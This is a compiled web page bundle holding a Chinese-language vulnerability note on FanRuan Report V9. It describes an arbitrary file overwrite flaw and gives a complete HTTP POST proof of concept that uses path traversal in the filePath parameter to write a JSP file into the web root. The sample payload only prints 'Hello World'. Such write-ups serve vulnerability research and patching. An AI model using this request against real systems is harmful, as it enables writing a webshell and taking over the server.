import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>帆软 V9
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091128879.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
Host: 192.168.10.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE
Connection: close
Content-Type:text/xml;charset=UTF-8

Content-Length: 74

{&quot;__CONTENT__&quot;:&quot;&lt;%out.println(\\&quot;Hello World!\\&quot;);%&gt;&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7),l=[d];function s(r,c){return i(),n("div",null,l)}const v=e(t,[["render",s],["__file","帆软报表 V9 任意文件覆盖文件上传.html.vue"]]);export{v as default};
